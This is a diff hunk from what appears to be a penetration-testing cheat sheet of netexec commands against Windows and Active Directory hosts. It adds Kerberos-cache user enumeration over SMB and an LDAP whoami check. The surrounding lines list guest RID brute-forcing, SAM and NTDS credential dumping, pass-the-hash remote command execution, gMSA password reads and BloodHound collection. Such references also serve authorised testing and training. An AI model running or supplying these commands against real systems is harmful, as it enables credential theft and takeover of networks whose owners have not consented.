@@ -2593,6 +2593,7 @@ netexec smb <RHOST> -u guest -p '' --shares --rid-brute
 netexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
 netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
 netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
+netexec smb <RHOST> -u "<USERNAME>" --use-kcache --users
 netexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
 netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
 netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
@@ -2610,6 +2611,7 @@ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
 netexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
 netexec ldap <RHOST> -u '' -p '' -M get-desc-users
 netexec ldap <RHOST> -u "" -p "" -M get-desc-users
+netexec ldap <RHOST> -u "" -p "" --use-kcache -M whoami
 netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
 netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
